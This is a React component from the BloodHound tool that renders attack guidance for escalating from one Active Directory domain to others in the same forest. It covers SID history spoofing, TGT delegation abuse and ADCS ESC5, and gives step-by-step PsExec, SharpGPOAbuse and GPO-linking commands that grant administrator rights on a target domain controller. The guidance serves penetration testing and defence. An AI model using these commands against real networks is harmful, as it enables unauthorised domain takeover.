// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                An attacker with control over any domain within the forest can escalate their privileges to compromise
                other domains using multiple techniques.
            </Typography>

            <Typography variant='body1'>Spoof SID history</Typography>
            <Typography variant='body2'>
                An attacker can spoof the SID history of a principal in the target domain, tricking the target domain
                into treating the attacker as that privileged principal.
            </Typography>
            <Typography variant='body2'>
                Refer to the SpoofSIDHistory edge documentation under References for more details. The edge describes an
                attack over a cross-forest trust, but the principles remain the same.
            </Typography>
            <Typography variant='body2'>
                This attack fails if <i>quarantine mode</i> is enabled (Spoof SID History Blocked = True) on the trust
                relationship in the opposite direction of the attack. The SID filtering removes SIDs belonging to any
                other domain than the attacker-controlled domain from the authentication request. However, enabling
                quarantine is rare and generally not recommended for same-forest trusts.
            </Typography>

            <Typography variant='body1'>Abuse TGT delegation</Typography>
            <Typography variant='body2'>
                An attacker can coerce a privileged computer (e.g., a domain controller (DC)) in the target domain to
                authenticate to an attacker-controlled computer configured with unconstrained delegation. This provides
                the attacker with a Kerberos TGT for the coerced computer.
            </Typography>
            <Typography variant='body2'>
                Refer to the AbuseTGTDelegation edge documentation under References for more details. The edge describes
                an attack over a cross-forest trust, but the principles remain the same.
            </Typography>
            <Typography variant='body2'>
                This attack fails if <i>quarantine mode</i> is enabled on the trust relationship in the opposite
                direction of the attack. This prevents TGTs from being sent across the trust. However, enabling
                quarantine is rare and generally not recommended for same-forest trusts.
            </Typography>

            <Typography variant='body1'>ADCS ESC5</Typography>
            <Typography variant='body2'>
                The Configuration Naming Context (NC) is a forest-wide partition writable by any DC within the forest.
                Most Active Directory Certificate Services (ADCS) configurations are stored in the Configuration NC. An
                attacker can abuse a DC to modify ADCS configurations to enable an ADCS domain escalation opportunity
                that compromises the entire forest.
            </Typography>
            <Typography variant='body2'>
                Attack steps:
                <ol style={{ listStyleType: 'decimal', paddingLeft: '1.5em' }}>
                    <li>Obtain a SYSTEM session on a DC in the attacker-controlled domain</li>
                    <li>Create a certificate template allowing ESC1 abuse</li>
                    <li>Publish the certificate template to an enterprise CA</li>
                    <li>Enroll the certificate as a privileged user in the target domain</li>
                    <li>Authenticate as the privileged user in the target domain using the certificate</li>
                </ol>
            </Typography>
            <Typography variant='body2'>
                Refer to "From DA to EA with ESC5" under References for more details.
                <br />
                <br />
                If ADCS is not installed: An attacker can simply install ADCS in the environment and exploit it, as
                detailed in the reference "Escalating from child domain’s admins to enterprise admins in 5 minutes by
                abusing AD CS, a follow up".
            </Typography>
            <Typography variant='body1'>GPO linked on Site</Typography>
            <Typography variant='body2'>
                AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest.
                An attacker with SYSTEM access to a DC can link a malicious GPO to the site of any DC in the forest.
            </Typography>

            <Typography variant='body2'>
                <b>Step 1: Obtain a SYSTEM session on a DC in the attacker-controlled domain</b>
                <br />
                Use PsExec to start a PowerShell terminal as SYSTEM on the DC:
            </Typography>
            <Typography component={'pre'}>{'PsExec64.exe -s -i -accepteula powershell'}</Typography>

            <Typography variant='body2'>
                <b>Step 2: Create a GPO</b>
                <br />
                Use the GroupPolicy module of RSAT to create the new GPO:
            </Typography>
            <Typography component={'pre'}>{'New-GPO -Name "MyGPO"'}</Typography>

            <Typography variant='body2'>
                <b>Step 3: Add the compromising setting to the GPO</b>
                <br />
                Use SharpGPOAbuse to add a scheduled task that adds a compromised user to the Administrators group:
            </Typography>
            <Typography component={'pre'}>
                {
                    '.\\SharpGPOAbuse.exe --AddComputerTask --TaskName "MyTask" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup Administrators /Add DUMPSTER\\tim" --GPOName "MyGPO"'
                }
            </Typography>

            <Typography variant='body2'>
                <b>Step 4: Identify a target DC and it's site</b>
                <br />
                Use the ActiveDirectory module of RSAT to query for DCs in the target domain:
            </Typography>
            <Typography component={'pre'}>
                {'Get-ADDomainController -server bastion.local | select Name,Site'}
            </Typography>
            <Typography variant='body2'>Look up the site DistinguishedName:</Typography>
            <Typography component={'pre'}>
                {'Get-ADReplicationSite Default-First-Site-Name | select DistinguishedName'}
            </Typography>

            <Typography variant='body2'>
                <b>Step 5: Set the GPO permissions</b>
                <br />
                This step is important to avoid applying the GPO to all computers connected to the site. Use the
                GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object
                but only the targeted computer applies the GPO settings:
            </Typography>
            <Typography component={'pre'}>
                {'$GPO = Get-GPO -Name "MyGPO"\n' +
                    '$GPO | Set-GPPermissions -PermissionLevel GpoRead -TargetName "Authenticated Users" -TargetType Group -Replace\n' +
                    '$GPO | Set-GPPermissions -PermissionLevel GpoApply -TargetName "BASTION\\bldc01" -TargetType Computer'}
            </Typography>

            <Typography variant='body2'>
                <b>Step 6: Link the GPO to the site</b>
                <br />
                Use the GroupPolicy module of RSAT to link the GPO to the site:
            </Typography>
            <Typography component={'pre'}>
                {
                    'New-GPLink -Name "MyGPO" -Target "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=bastion,DC=local" -Server dc01.dumpster.fire'
                }
            </Typography>
            <Typography variant='body2'>
                Note that you must specify the server to be the DC where you are running the command, as the command
                defaults to execute the change on a root domain DC where the compromised DC does not have the
                permissions to link the GPO.
                <br />
                <br />
                Wait until replication has happened and the GPO has applied on the target DC, and log in with
                Administrators access on the compromised DC. Replication within the same site happens within 15 seconds
                but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by
                default.
            </Typography>
        </>
    );
};

export default Abuse;
